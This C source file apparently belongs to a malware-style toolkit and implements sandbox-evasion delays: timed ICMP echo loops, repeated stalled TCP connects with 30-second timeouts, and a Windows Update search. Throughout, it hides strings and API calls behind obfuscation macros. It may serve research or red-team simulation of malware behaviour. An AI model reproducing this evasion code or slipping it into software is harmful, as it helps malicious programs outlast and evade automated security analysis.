//
// skulk@ioc.ninja
//
#include "xDelay.h"

#include <stdio.h>
#include <Windows.h>

#include <Ipexport.h>
#include <Icmpapi.h>
#include <Wuapi.h>

#include "xLibMaliciousApi.h"
#include "xObfuscation.h"
#include "xOsApi.h"


#define X_DELAY_NETWORK_TIMEOUT	30
#define X_DELAY_NETWORK_COUNT	20
#define X_DELAY_ICMP_SLEEP		100
#define X_DELAY_ICMP_DURATION	1000



void xDelayIcmp()
{
	HANDLE icmp = X_IPHLPAPI_CALL(IcmpCreateFile)();

	if (icmp != INVALID_HANDLE_VALUE)
	{
		const char* sendData = X_OBFUSCATED_STRING_A("666d");

		uint32_t replySize = sizeof(ICMP_ECHO_REPLY) + (uint32_t) strlen(sendData) * sizeof(char);

		void* replyBuffer = (void*) X_LIB_MALICIOUS_CALL(xMemoryAlloc)(replySize);

		if (replyBuffer)
		{
			uint32_t roundtripTime = 0;

			do
			{
				IPAddr ip = X_WS2_32_CALL(inet_addr)(X_OBFUSCATED_STRING_A("10.0.0.0"));

				if (X_IPHLPAPI_CALL(IcmpSendEcho)(icmp, ip, (void*) sendData, sizeof(sendData), NULL, replyBuffer, replySize, 1000))
				{
					PICMP_ECHO_REPLY echoReply = (PICMP_ECHO_REPLY) replyBuffer;

					roundtripTime += echoReply->RoundTripTime;

					X_KERNEL32_CALL(Sleep)(X_DELAY_ICMP_SLEEP);
				}
				else
				{
					// Just a rough guess
					roundtripTime += 25;

					X_KERNEL32_CALL(Sleep)(X_DELAY_ICMP_SLEEP);
				}
			}
			while (roundtripTime < X_DELAY_ICMP_DURATION);

			X_LIB_MALICIOUS_CALL(xMemoryFree)(replyBuffer);
		}    

		X_IPHLPAPI_CALL(IcmpCloseHandle)(icmp);
	}
}

void xDelayInternalNetwork()
{
	WSADATA wsaData = {0};

	if (X_WS2_32_CALL(WSAStartup)(MAKEWORD(2, 2), &wsaData) == NO_ERROR)
	{
		for (uint32_t ui = 0; ui < X_DELAY_NETWORK_COUNT; ui++)
		{
			SOCKET s = X_WS2_32_CALL(socket)(AF_INET, SOCK_STREAM, IPPROTO_TCP);

			if (s != INVALID_SOCKET)
			{
				sockaddr_in fake;

				fake.sin_family = AF_INET;

				fake.sin_addr.s_addr = X_WS2_32_CALL(inet_addr)(X_OBFUSCATED_STRING_A("127.0.0.1"));

				fake.sin_port = X_WS2_32_CALL(htons)((u_short) atoi(X_OBFUSCATED_STRING_A("80")));

				// Set socket in non-blocking mode (we want to specify extended timoeout)
				u_long mode = 1;

				X_WS2_32_CALL(ioctlsocket)(s, FIONBIO, &mode);

				X_WS2_32_CALL(connect)(s, (sockaddr*) &fake, sizeof(fake));

				// Reset socket mode to blocking
				mode = 0;

				X_WS2_32_CALL(ioctlsocket)(s, FIONBIO, &mode);

				fd_set fd = {0};

				FD_ZERO(&fd);

				FD_SET(s, &fd);

				timeval timeout;

				timeout.tv_sec = X_DELAY_NETWORK_TIMEOUT;

				timeout.tv_usec = 0;

				// Create delay
				X_WS2_32_CALL(select)(0, &fd, NULL, NULL, &timeout);

				X_WS2_32_CALL(closesocket)(s);
			}
		}

		X_WS2_32_CALL(WSACleanup)();
	}
}

void xDelayWindowsUpdate()
{
	HRESULT hr = S_OK;

	if (SUCCEEDED(hr = X_OLE32_CALL(CoInitialize)(NULL)))
	{
		IUpdateSession* updateSession = NULL;

		if (SUCCEEDED(hr = X_OLE32_CALL(CoCreateInstance)(CLSID_UpdateSession, NULL, CLSCTX_INPROC_SERVER, IID_IUpdateSession, (void**) &updateSession)))
		{
			IUpdateSearcher* updateSearcher = NULL;

			if (SUCCEEDED(hr = updateSession->CreateUpdateSearcher(&updateSearcher)))
			{
				BSTR criteria = X_OLEAUT32_CALL(SysAllocString)(X_OBFUSCATED_STRING_W(L"IsInstalled=0"));

				if (criteria)
				{
					ISearchResult* searchResult = NULL;

					if (SUCCEEDED(hr = updateSearcher->Search(criteria, &searchResult)))
					{
						searchResult->Release();
					}

					X_OLEAUT32_CALL(SysFreeString)(criteria);
				}

				updateSearcher->Release();
			}

			updateSession->Release();
		}

		X_OLE32_CALL(CoUninitialize)();
	}
}
